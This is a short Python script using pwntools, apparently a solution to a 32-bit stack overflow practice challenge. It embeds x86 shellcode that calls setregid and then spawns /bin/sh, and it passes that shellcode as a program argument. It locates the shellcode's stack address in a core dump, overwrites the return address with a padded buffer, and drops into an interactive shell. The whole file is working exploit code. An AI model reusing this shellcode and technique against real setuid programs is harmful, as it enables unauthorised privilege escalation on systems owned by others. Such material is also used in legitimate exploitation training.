#!/usr/bin/env python

from pwn import *
SHELLCODE="\x90j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80"


#p=process(["./stack-ovfl-no-envp-32","\x90j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80"])

#buff = "A" * 0x88 + "A" * 4 + "BBBB"
#p.send(buff)
#p.wait()


c = Core('core')
#print c.argv
#buff_addr = c.argv[1]
buff_addr = c.stack.find(SHELLCODE)
print(hex(buff_addr))


buf = "A" * (0x14-4)
buf += p32(buff_addr)
#p=process(argv)
p=process(["./stack-ovfl-no-envp-32","\x90j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80"])
p.sendline(buf)

p.interactive()

